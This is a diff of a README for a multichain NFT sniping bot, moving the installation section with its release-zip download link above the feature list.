@@ -7,6 +7,11 @@
 <img src="https://raw.githubusercontent.com/JackRussel77/Multichain-NFT-Sniper/main/1.3.7.PNG" width="350" height="350">
 
 
+## Installation
+
+<b><u>Download the latest release below:</b></u>
+
+<a href="https://github.com/JackRussel77/Multichain-NFT-Sniper/releases/download/multichain-nft-sniper/Multichain.NFT.Sniper.1.3.7.zip" title="Latest Version (v1.3.7)">Latest Version (v1.3.7)</a>
 
 
 ## Features
@@ -17,17 +22,6 @@
 - Blockchains supported: Ethereum, Polygon, Solana, Fantom, & Avalanche
 - Custom amount of NFTs to mint per address
 - Local Node (Fastest way to beat all other bots, learn more by setting up your own Local node and then enabling it in the application.)
-
-
-
-
-## Installation
-
-<b><u>Download the latest release below:</b></u>
-
-<a href="https://github.com/JackRussel77/Multichain-NFT-Sniper/releases/download/multichain-nft-sniper/Multichain.NFT.Sniper.1.3.7.zip" title="Latest Version (v1.3.7)">Latest Version (v1.3.7)</a>
-
-
 
 
 ## Optimizations
